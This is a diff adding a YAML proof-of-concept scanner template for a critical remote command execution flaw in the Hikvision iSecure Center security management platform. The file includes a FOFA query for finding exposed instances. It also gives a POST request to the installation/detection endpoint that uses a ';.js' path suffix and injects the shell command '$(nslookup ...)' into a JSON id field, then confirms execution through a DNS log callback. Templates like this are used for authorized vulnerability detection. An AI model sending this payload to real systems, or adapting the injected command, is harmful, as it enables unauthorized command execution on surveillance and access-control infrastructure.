@@ -1,0 +1,20 @@
+id: poc-yaml-safetrolley-installation-detection-rce
+info:
+  name: 海康detection远程命令执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: HiKVISION 综合安防管理平台
+  fofa: app="HIKVISION-iSecure-Center"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /center/api/installation/detection;.js
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"type": "environment", "operate": "", "machines": {"id": "$(nslookup {{.reverseDomain}})"}}'
+  expression: reverse.Verify()
+transport: http
